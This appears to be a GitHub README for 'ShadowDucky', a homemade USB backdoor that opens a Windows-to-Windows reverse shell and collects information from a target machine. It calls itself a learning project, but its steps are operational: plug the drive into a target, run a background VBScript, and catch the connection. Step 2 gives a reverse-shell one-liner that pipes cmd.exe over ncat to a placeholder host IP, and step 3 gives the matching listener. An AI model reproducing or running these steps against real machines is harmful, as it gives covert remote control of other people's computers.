# ShadowDucky-USB

![ShadowDucky](https://user-images.githubusercontent.com/122622018/214044473-d0ce4b61-d29f-4951-b54e-67dd459dee8a.png)

This is a homemade "Rubber Ducky." It provides the user with a reverse shell and can grab information for Windows-to-Windows applications.

**NOTE:**
- Most file paths in the files start with "D:\" because its application is from a USB. The "ShadowDuckyV1.2A" folder is not needed; the proper format for the flash drive is how it's set up inside that folder.
- Shortcuts may need to be re-made for your application.

**WELCOME TO SHADOW DUCKY...**
*TRY AND READ THE HIDDEN MESSAGE...*

INFO: This is a USB remote backdoor. The program "ShadowDucky" will run when "ShadowDuckyV2.vsb" is double-clicked. Some files will have to be edited in Notepad to suit its application. Please follow the listed instructions below to help you properly run "ShadowDucky."

This was created as a project to learn PowerShell functionality, scripting with different coding languages, and reverse shelling. It is a reverse shell for Windows to Windows.

**NOTE:**
- Required resources will be PowerShell, Nmap, and Windows.
- ShadowDucky uses a combination of VBScript, ".bat" cmd, and PowerShell functionality.
- It runs in the background for better use.

**INSTRUCTIONS:**

1. Install "nmap" on both your computer and the target device to use ShadowDucky. [Download Nmap](https://nmap.org/download).

2. Place the IP of your host device into "RubberDucky.bat." Enter the IP of the host and the PORT being used into that function.
   Example: `powershell -command do {ncat FF.FF.FF.FF PORT -e cmd.exe} until ($ping)`

3. After changing settings, plug ShadowDucky USB into the target device, double-click ShadowDuckyV2.vbs, and watch the show.
   Return to the host device and use PowerShell with the following command to connect to the target device.
   Example: `ncat -l -p PORT -v`

4. Enjoy! @-[:]
